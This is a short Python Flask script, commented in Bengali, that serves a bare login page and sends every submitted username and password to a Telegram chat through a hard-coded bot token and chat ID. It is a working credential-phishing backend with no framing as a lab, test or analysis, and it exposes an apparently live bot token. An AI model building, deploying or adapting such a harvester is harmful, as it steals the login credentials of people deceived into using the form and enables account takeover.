import requests
from flask import Flask, request

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8820038438:AAFI-8Ecx7fqBgfhIOilHyJ8V8ABi3ZqEJ4'
CHAT_ID = '6397893832'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # টেলিগ্রামে মেসেজ পাঠানোর সঠিক ইউআরএল ও ডাটা
        text_msg = f"🚨 নতুন লগইন তথ্য!\n\n👤 Username: {username}\n🔑 Password: {password}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text_msg}"
        
        try:
            requests.get(url)
        except Exception as e:
            print("Error:", e)
            
        return "Login successful! Data sent to Telegram."

    return '''
        <div style="text-align: center; margin-top: 100px; font-family: Arial;">
            <h2>Login</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" style="padding: 8px; margin: 5px;"><br>
                <input type="password" name="password" placeholder="Password" style="padding: 8px; margin: 5px;"><br>
                <input type="submit" value="Login" style="padding: 8px 15px; margin-top: 10px;">
            </form>
        </div>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
